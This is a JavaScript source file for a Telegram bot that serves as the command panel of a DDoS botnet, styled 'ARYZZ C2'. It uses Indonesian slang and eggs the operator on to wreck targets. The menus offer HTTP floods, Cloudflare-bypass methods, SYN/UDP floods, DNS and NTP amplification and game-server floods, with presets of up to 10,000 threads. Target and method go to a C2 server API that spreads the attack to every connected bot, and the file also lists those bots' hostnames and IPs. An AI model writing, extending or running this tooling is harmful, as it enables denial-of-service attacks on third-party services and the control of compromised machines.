import { Telegraf, Markup } from 'telegraf';
import { message } from 'telegraf/filters';
import axios from 'axios';
import { logger } from '../utils/logger.js';

export class TelegramBotInline {
    constructor(token, adminIds, config) {
        this.bot = new Telegraf(token);
        this.adminIds = Array.isArray(adminIds) ? adminIds : [adminIds];
        this.config = config;
        this.userSessions = new Map(); // Store user input sessions
        this.setupHandlers();
    }

    isAdmin(userId) {
        return this.adminIds.includes(userId.toString());
    }

    // Main menu keyboard
    mainMenu() {
        return Markup.keyboard([
            ['⚡ Attack Biasa', '🔥 C2 Attack'],
            ['🎯 Combo Attack', '📊 Status'],
            ['🤖 Lihat Bots', '📋 Methods'],
            ['⚙️ Settings', '❌ Stop All']
        ]).resize();
    }

    // Layer selection
    layerMenu() {
        return Markup.inlineKeyboard([
            [
                Markup.button.callback('🌐 Layer 7 (HTTP)', 'layer_7'),
                Markup.button.callback('🔌 Layer 4 (TCP/UDP)', 'layer_4')
            ],
            [Markup.button.callback('« Kembali', 'back_main')]
        ]);
    }

    // Layer 7 methods (split into pages)
    layer7MethodsPage1() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('GET', 'method_GET'), Markup.button.callback('POST', 'method_POST')],
            [Markup.button.callback('HTTP2', 'method_HTTP2'), Markup.button.callback('HTTP3', 'method_HTTP3')],
            [Markup.button.callback('CFB', 'method_CFB'), Markup.button.callback('BYPASS', 'method_BYPASS')],
            [Markup.button.callback('HTTP2-CF', 'method_HTTP2-CF'), Markup.button.callback('ULTIMATE', 'method_ULTIMATE')],
            [Markup.button.callback('PRIVACYPASS', 'method_PRIVACYPASS'), Markup.button.callback('CAPTCHA', 'method_CAPTCHA')],
            [Markup.button.callback('➡️ More Methods', 'layer7_page2'), Markup.button.callback('« Back', 'back_layer')]
        ]);
    }

    layer7MethodsPage2() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('SLOW', 'method_SLOW'), Markup.button.callback('STRESS', 'method_STRESS')],
            [Markup.button.callback('DYN', 'method_DYN'), Markup.button.callback('COOKIE', 'method_COOKIE')],
            [Markup.button.callback('XMLRPC', 'method_XMLRPC'), Markup.button.callback('APACHE', 'method_APACHE')],
            [Markup.button.callback('NULL', 'method_NULL'), Markup.button.callback('CF-KILLER', 'method_CF-KILLER')],
            [Markup.button.callback('BOT', 'method_BOT'), Markup.button.callback('HEAD', 'method_HEAD')],
            [Markup.button.callback('⬅️ Prev', 'layer7_page1'), Markup.button.callback('« Back', 'back_layer')]
        ]);
    }

    // Layer 4 methods
    layer4Methods() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('UDP', 'method_UDP'), Markup.button.callback('TCP', 'method_TCP')],
            [Markup.button.callback('SYN', 'method_SYN'), Markup.button.callback('CONNECTION', 'method_CONNECTION')],
            [Markup.button.callback('MINECRAFT', 'method_MINECRAFT'), Markup.button.callback('MCBOT', 'method_MCBOT')],
            [Markup.button.callback('VSE', 'method_VSE'), Markup.button.callback('TS3', 'method_TS3')],
            [Markup.button.callback('FIVEM', 'method_FIVEM'), Markup.button.callback('MCPE', 'method_MCPE')],
            [Markup.button.callback('DNS-AMP', 'method_DNS-AMP'), Markup.button.callback('NTP-AMP', 'method_NTP-AMP')],
            [Markup.button.callback('« Back', 'back_layer')]
        ]);
    }

    // Quick presets
    quickPresets() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔥 CF Bypass', 'preset_cf')],
            [Markup.button.callback('⚡ HTTP Flood', 'preset_http')],
            [Markup.button.callback('💣 UDP Flood', 'preset_udp')],
            [Markup.button.callback('🎮 Game Server', 'preset_game')],
            [Markup.button.callback('🚀 Ultimate', 'preset_ultimate')],
            [Markup.button.callback('« Kembali', 'back_main')]
        ]);
    }

    setupHandlers() {
        // Start command
        this.bot.start((ctx) => {
            if (!this.isAdmin(ctx.from.id)) {
                return ctx.reply('❌ SIAPA LU ANJIR? GAK PUNYA AKSES BEGO!');
            }

            ctx.reply(
                `🔥 *ARYZZ C2 BOT - VERSI BUTTON* 🔥\n\n` +
                `Woy ${ctx.from.first_name}, udah siap ngancurin target? 😈\n\n` +
                `Pilih menu di bawah ya bro!`,
                { parse_mode: 'Markdown', ...this.mainMenu() }
            );
        });

        // Main menu buttons
        this.bot.hears('⚡ Attack Biasa', (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            const session = { type: 'single', step: 'target' };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.reply(
                '🎯 *ATTACK BIASA*\n\n' +
                'Kirim target lu (URL atau IP:PORT):\n\n' +
                'Contoh:\n' +
                '• https://target.com\n' +
                '• 1.2.3.4:80\n' +
                '• mc.server.com:25565',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.hears('🔥 C2 Attack', (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            const session = { type: 'c2', step: 'target' };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.reply(
                '🔥🔥🔥 *C2 DISTRIBUTED ATTACK* 🔥🔥🔥\n\n' +
                'Attack bakal distributed ke SEMUA bot!\n\n' +
                'Kirim target lu:',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.hears('🎯 Combo Attack', (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            ctx.reply(
                '🎯 *COMBO ATTACK*\n\n' +
                'Pilih preset atau custom?',
                this.quickPresets()
            );
        });

        this.bot.hears('📊 Status', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            await this.showC2Status(ctx);
        });

        this.bot.hears('🤖 Lihat Bots', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            await this.showBots(ctx);
        });

        this.bot.hears('📋 Methods', (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            ctx.reply(
                '📋 *PILIH LAYER*\n\n' +
                'Layer 7: HTTP/HTTPS attacks\n' +
                'Layer 4: TCP/UDP attacks',
                { parse_mode: 'Markdown', ...this.layerMenu() }
            );
        });

        this.bot.hears('❌ Stop All', async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            ctx.reply(
                '⚠️ *STOP SEMUA ATTACK?*\n\n' +
                'Lu yakin mau stop semua attack yang lagi jalan?',
                Markup.inlineKeyboard([
                    [Markup.button.callback('✅ Ya, Stop!', 'confirm_stop')],
                    [Markup.button.callback('❌ Batal', 'back_main')]
                ])
            );
        });

        // Callback query handlers
        this.bot.action('back_main', (ctx) => {
            ctx.editMessageText(
                'Menu utama:',
                this.mainMenu()
            );
        });

        this.bot.action('back_layer', (ctx) => {
            ctx.editMessageText(
                '📋 *PILIH LAYER*\n\n' +
                'Layer 7: HTTP/HTTPS attacks\n' +
                'Layer 4: TCP/UDP attacks',
                { parse_mode: 'Markdown', ...this.layerMenu() }
            );
        });

        this.bot.action('layer_7', (ctx) => {
            ctx.editMessageText(
                '🌐 *LAYER 7 METHODS*\n\n' +
                'Pilih method yang mau dipake:',
                { parse_mode: 'Markdown', ...this.layer7MethodsPage1() }
            );
        });

        this.bot.action('layer7_page2', (ctx) => {
            ctx.editMessageText(
                '🌐 *LAYER 7 METHODS (Page 2)*\n\n' +
                'Pilih method yang mau dipake:',
                { parse_mode: 'Markdown', ...this.layer7MethodsPage2() }
            );
        });

        this.bot.action('layer7_page1', (ctx) => {
            ctx.editMessageText(
                '🌐 *LAYER 7 METHODS*\n\n' +
                'Pilih method yang mau dipake:',
                { parse_mode: 'Markdown', ...this.layer7MethodsPage1() }
            );
        });

        this.bot.action('layer_4', (ctx) => {
            ctx.editMessageText(
                '🔌 *LAYER 4 METHODS*\n\n' +
                'Pilih method yang mau dipake:',
                { parse_mode: 'Markdown', ...this.layer4Methods() }
            );
        });

        // Method selection
        this.bot.action(/^method_(.+)$/, (ctx) => {
            const method = ctx.match[1];
            const session = this.userSessions.get(ctx.from.id);
            
            if (session) {
                session.method = method;
                session.step = 'threads';
                this.userSessions.set(ctx.from.id, session);
                
                ctx.editMessageText(
                    `✅ Method: *${method}*\n\n` +
                    `Berapa threads yang mau dipake?\n\n` +
                    `Recommended:\n` +
                    `• Light: 100-500\n` +
                    `• Medium: 500-2000\n` +
                    `• Heavy: 2000-10000\n\n` +
                    `Kirim angka nya:`,
                    { parse_mode: 'Markdown' }
                );
            } else {
                ctx.answerCbQuery('Mulai dari menu utama dulu bro!');
            }
        });

        // Preset handlers
        this.bot.action('preset_cf', (ctx) => {
            const session = { 
                type: 'c2', 
                step: 'target',
                preset: 'cf',
                method: 'HTTP2-CF,CFB,BYPASS',
                threads: 5000,
                duration: 300,
                rpc: 10
            };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.editMessageText(
                '🔥 *CLOUDFLARE BYPASS PRESET*\n\n' +
                'Methods: HTTP2-CF, CFB, BYPASS\n' +
                'Threads: 5000\n' +
                'Duration: 300s\n\n' +
                'Kirim target lu:',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.action('preset_http', (ctx) => {
            const session = { 
                type: 'c2', 
                step: 'target',
                preset: 'http',
                method: 'GET,POST,HTTP2,HTTP3',
                threads: 5000,
                duration: 300,
                rpc: 10
            };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.editMessageText(
                '⚡ *HTTP FLOOD PRESET*\n\n' +
                'Methods: GET, POST, HTTP2, HTTP3\n' +
                'Threads: 5000\n' +
                'Duration: 300s\n\n' +
                'Kirim target lu:',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.action('preset_udp', (ctx) => {
            const session = { 
                type: 'c2', 
                step: 'target',
                preset: 'udp',
                method: 'UDP',
                threads: 10000,
                duration: 300,
                rpc: 1
            };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.editMessageText(
                '💣 *UDP FLOOD PRESET*\n\n' +
                'Method: UDP\n' +
                'Threads: 10000\n' +
                'Duration: 300s\n\n' +
                'Kirim target (IP:PORT):',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.action('preset_game', (ctx) => {
            const session = { 
                type: 'c2', 
                step: 'target',
                preset: 'game',
                method: 'MINECRAFT,VSE,TS3',
                threads: 5000,
                duration: 300,
                rpc: 1
            };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.editMessageText(
                '🎮 *GAME SERVER PRESET*\n\n' +
                'Methods: MINECRAFT, VSE, TS3\n' +
                'Threads: 5000\n' +
                'Duration: 300s\n\n' +
                'Kirim target (IP:PORT):',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.action('preset_ultimate', (ctx) => {
            const session = { 
                type: 'c2', 
                step: 'target',
                preset: 'ultimate',
                method: 'GET,POST,HTTP2,HTTP3,CFB,BYPASS,ULTIMATE',
                threads: 10000,
                duration: 300,
                rpc: 10
            };
            this.userSessions.set(ctx.from.id, session);
            
            ctx.editMessageText(
                '🚀 *ULTIMATE PRESET*\n\n' +
                'Methods: GET, POST, HTTP2, HTTP3, CFB, BYPASS, ULTIMATE\n' +
                'Threads: 10000\n' +
                'Duration: 300s\n\n' +
                'Kirim target lu:',
                { parse_mode: 'Markdown' }
            );
        });

        this.bot.action('confirm_stop', async (ctx) => {
            // TODO: Implement stop all attacks
            ctx.editMessageText(
                '✅ *SEMUA ATTACK DISTOP!*\n\n' +
                'Semua attack yang lagi jalan udah distop.',
                { parse_mode: 'Markdown' }
            );
        });

        // Text message handler (for user input)
        this.bot.on(message('text'), async (ctx) => {
            if (!this.isAdmin(ctx.from.id)) return;
            
            const session = this.userSessions.get(ctx.from.id);
            if (!session) return;

            const text = ctx.message.text;

            // Handle based on current step
            if (session.step === 'target') {
                session.target = text;
                
                if (session.preset) {
                    // Preset selected, launch directly
                    await this.launchC2Attack(ctx, session);
                    this.userSessions.delete(ctx.from.id);
                } else {
                    // Ask for method
                    session.step = 'method';
                    this.userSessions.set(ctx.from.id, session);
                    
                    ctx.reply(
                        `✅ Target: \`${text}\`\n\n` +
                        `Pilih method:`,
                        { parse_mode: 'Markdown', ...this.layerMenu() }
                    );
                }
            } else if (session.step === 'threads') {
                const threads = parseInt(text);
                if (isNaN(threads) || threads < 1) {
                    return ctx.reply('❌ Threads harus angka yang valid bro!');
                }
                
                session.threads = threads;
                session.step = 'duration';
                this.userSessions.set(ctx.from.id, session);
                
                ctx.reply(
                    `✅ Threads: *${threads}*\n\n` +
                    `Berapa lama attack nya? (detik)\n\n` +
                    `Recommended:\n` +
                    `• Short: 60-120s\n` +
                    `• Medium: 120-300s\n` +
                    `• Long: 300-600s\n\n` +
                    `Kirim angka nya:`,
                    { parse_mode: 'Markdown' }
                );
            } else if (session.step === 'duration') {
                const duration = parseInt(text);
                if (isNaN(duration) || duration < 1) {
                    return ctx.reply('❌ Duration harus angka yang valid bro!');
                }
                
                session.duration = duration;
                session.rpc = 10; // Default RPC
                
                // Launch attack
                if (session.type === 'c2') {
                    await this.launchC2Attack(ctx, session);
                } else {
                    await this.launchSingleAttack(ctx, session);
                }
                
                this.userSessions.delete(ctx.from.id);
            }
        });
    }

    async launchC2Attack(ctx, session) {
        const { target, method, threads, duration, rpc } = session;
        
        ctx.reply(
            `🔥🔥🔥 *C2 DISTRIBUTED ATTACK!* 🔥🔥🔥\n\n` +
            `🎯 Target: \`${target}\`\n` +
            `⚡ Method: *${method}*\n` +
            `🧵 Threads: *${threads}*\n` +
            `⏱ Duration: *${duration}s*\n` +
            `🔄 RPC: *${rpc}*\n\n` +
            `💣 LAUNCHING KE SEMUA BOT... 💣`,
            { parse_mode: 'Markdown' }
        );

        const c2Url = this.config.c2?.url || 'http://localhost:8080';
        const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';

        try {
            const https = await import('https');
            const response = await axios.post(
                `${c2Url}/api/attack/start`,
                { target, method, threads, duration, rpc },
                {
                    headers: {
                        'X-API-Key': apiKey,
                        'Content-Type': 'application/json'
                    },
                    timeout: 10000,
                    httpsAgent: new https.Agent({
                        rejectUnauthorized: false
                    })
                }
            );

            if (response.data.success) {
                ctx.reply(
                    `✅ *ATTACK LAUNCHED!* ✅\n\n` +
                    `🆔 Attack ID: \`${response.data.attack.id}\`\n` +
                    `🔥 SEMUA BOT UDAH MULAI NGHAJAR! 🔥`,
                    { parse_mode: 'Markdown', ...this.mainMenu() }
                );
            } else {
                ctx.reply(`❌ *GAGAL LAUNCH!* ${response.data.error}`, { parse_mode: 'Markdown' });
            }
        } catch (error) {
            ctx.reply(`❌ *ERROR ANJIR!* ${error.message}`, { parse_mode: 'Markdown' });
        }
    }

    async launchSingleAttack(ctx, session) {
        ctx.reply(
            `🔥 *ATTACK STARTED!* 🔥\n\n` +
            `Attack biasa belum implemented.\n` +
            `Pake C2 Attack aja bro!`,
            { parse_mode: 'Markdown', ...this.mainMenu() }
        );
    }

    async showC2Status(ctx) {
        const c2Url = this.config.c2?.url || 'http://localhost:8080';
        const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';

        try {
            const https = await import('https');
            const response = await axios.get(`${c2Url}/api/stats/overview`, {
                headers: { 'X-API-Key': apiKey },
                timeout: 5000,
                httpsAgent: new https.Agent({
                    rejectUnauthorized: false
                })
            });

            const stats = response.data.stats;
            ctx.reply(
                `🎯 *C2 SERVER STATUS* 🎯\n\n` +
                `🤖 *BOTS:*\n` +
                `• Total: *${stats.bots.total}*\n` +
                `• Online: *${stats.bots.online}* 🟢\n` +
                `• Offline: *${stats.bots.offline}* 🔴\n\n` +
                `⚡ *ATTACKS:*\n` +
                `• Total: *${stats.attacks.total}*\n` +
                `• Running: *${stats.attacks.running}* 🔥\n` +
                `• Completed: *${stats.attacks.completed}* ✅\n\n` +
                `📊 *REQUESTS:*\n` +
                `• Total: *${stats.requests.total.toLocaleString()}*\n` +
                `• Success: *${stats.requests.successful.toLocaleString()}* ✅\n\n` +
                `💪 BOTNET LU KUAT ANJIR!`,
                { parse_mode: 'Markdown', ...this.mainMenu() }
            );
        } catch (error) {
            ctx.reply(
                `❌ *C2 SERVER OFFLINE ATAU ERROR!*\n\n` +
                `Error: ${error.message}`,
                { parse_mode: 'Markdown', ...this.mainMenu() }
            );
        }
    }

    async showBots(ctx) {
        const c2Url = this.config.c2?.url || 'http://localhost:8080';
        const apiKey = this.config.c2?.apiKey || 'aryzz-c2-api-key-2024';

        try {
            const response = await axios.get(`${c2Url}/api/bots`, {
                headers: { 'X-API-Key': apiKey },
                timeout: 5000
            });

            const bots = response.data.bots;
            
            if (bots.length === 0) {
                return ctx.reply('ℹ️ Belum ada bot yang connect bro!', this.mainMenu());
            }

            let msg = `🤖 *DAFTAR BOT YANG CONNECT* 🤖\n\n`;
            msg += `Total: *${bots.length}* bot(s)\n\n`;

            bots.slice(0, 10).forEach((bot, index) => {
                const status = bot.status === 'online' ? '🟢' : '🔴';
                msg += `${status} *Bot ${index + 1}*\n`;
                msg += `• Host: ${bot.hostname}\n`;
                msg += `• IP: ${bot.ip}\n`;
                msg += `• OS: ${bot.os}\n\n`;
            });

            if (bots.length > 10) {
                msg += `\n... dan ${bots.length - 10} bot lainnya\n`;
            }

            msg += `\n💪 BOTNET LU SIAP TEMPUR!`;

            ctx.reply(msg, { parse_mode: 'Markdown', ...this.mainMenu() });
        } catch (error) {
            ctx.reply(`❌ *ERROR!* ${error.message}`, { parse_mode: 'Markdown', ...this.mainMenu() });
        }
    }

    launch() {
        this.bot.launch();
        logger.success('🔥 TELEGRAM BOT INLINE VERSION UDAH JALAN! 🔥');
        logger.info(`👤 Admin IDs: ${this.adminIds.join(', ')}`);
        
        process.once('SIGINT', () => this.bot.stop('SIGINT'));
        process.once('SIGTERM', () => this.bot.stop('SIGTERM'));
    }
}
